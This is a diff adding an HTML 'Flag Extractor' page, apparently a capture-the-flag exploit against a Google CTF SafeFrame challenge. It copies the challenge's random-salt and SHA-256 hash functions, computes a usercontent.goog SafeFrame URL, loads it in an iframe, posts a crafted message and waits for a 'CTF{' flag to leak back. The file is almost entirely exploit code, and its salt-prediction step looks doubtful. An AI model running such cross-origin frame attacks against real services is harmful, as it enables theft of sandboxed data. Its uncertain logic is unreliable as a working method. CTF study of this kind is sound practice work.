@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flag Extractor</title>
+</head>
+<body>
+    <script>
+        // Copy the getRandom function from util.js
+        function getRandom(n) {
+            return Array.from(Array(n), Math.random).map(e=>e.toString(36).slice(2)).join('');
+        }
+        
+        // Copy SafeFrame functions from safe-frame.js
+        function arrayToBase36(arr) {
+            return arr.reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0)).toString(36);
+        }
+        
+        function concatBuffers(...buffers) {
+            let length = 0;
+            for (const buf of buffers) {
+                length += buf.byteLength;
+            }
+            const newBuf = new Uint8Array(length);
+            let offset = 0;
+            for (const buf of buffers) {
+                newBuf.set(new Uint8Array(buf), offset);
+                offset += buf.byteLength;
+            }
+            return newBuf.buffer;
+        }
+        
+        async function calculateHash(...parts) {
+            const encoder = new TextEncoder();
+            const newParts = [];
+            for (let i = 0; i < parts.length; i++) {
+                const part = parts[i];
+                if (typeof part === "string") {
+                    newParts.push(encoder.encode(part).buffer);
+                } else {
+                    newParts.push(part);
+                }
+                if (i < parts.length - 1) {
+                    newParts.push(encoder.encode("$@#|").buffer);
+                }
+            }
+            const buffer = concatBuffers(...newParts);
+            const hash = await crypto.subtle.digest("SHA-256", buffer);
+            return arrayToBase36(new Uint8Array(hash)).padStart(50, "0").slice(0, 50);
+        }
+        
+        async function exploit() {
+            // The flag file will be added with cached=false, so it uses getRandom(5)
+            const predictedSalt = getRandom(5);
+            console.log('Predicted salt:', predictedSalt);
+            
+            // Calculate the SafeFrame hash
+            const product = "google-ctf";
+            const encoder = new TextEncoder();
+            const saltBuffer = encoder.encode(predictedSalt).buffer;
+            const hash = await calculateHash(product, saltBuffer, window.origin);
+            
+            // Construct the SafeFrame URL
+            const url = new URL(`https://${hash}-h748636364.scf.usercontent.goog/${product}/shim.html`);
+            url.searchParams.set("origin", window.origin);
+            
+            console.log('SafeFrame URL:', url.toString());
+            
+            // Create iframe to access the flag
+            const iframe = document.createElement('iframe');
+            iframe.src = url;
+            iframe.style.width = '100%';
+            iframe.style.height = '500px';
+            document.body.appendChild(iframe);
+            
+            // Listen for messages from the SafeFrame
+            window.addEventListener('message', (event) => {
+                console.log('Received message:', event);
+                if (event.data && typeof event.data === 'string' && event.data.includes('CTF{')) {
+                    console.log('🚩 FLAG FOUND:', event.data);
+                    alert('Flag: ' + event.data);
+                }
+            });
+            
+            // Wait for iframe to load, then send the flag content request
+            iframe.onload = () => {
+                console.log('Iframe loaded, attempting to communicate...');
+                
+                // Try to trigger the flag content display
+                const messageChannel = new MessageChannel();
+                messageChannel.port1.onmessage = (e) => {
+                    console.log('Port message:', e.data);
+                };
+                
+                // Send a message to the SafeFrame (this might trigger flag display)
+                iframe.contentWindow.postMessage({
+                    body: new ArrayBuffer(0),
+                    mimeType: 'text/plain',
+                    salt: saltBuffer
+                }, url.origin, [messageChannel.port2]);
+            };
+        }
+        
+        // Execute the exploit
+        exploit();
+    </script>
+</body>
+</html>
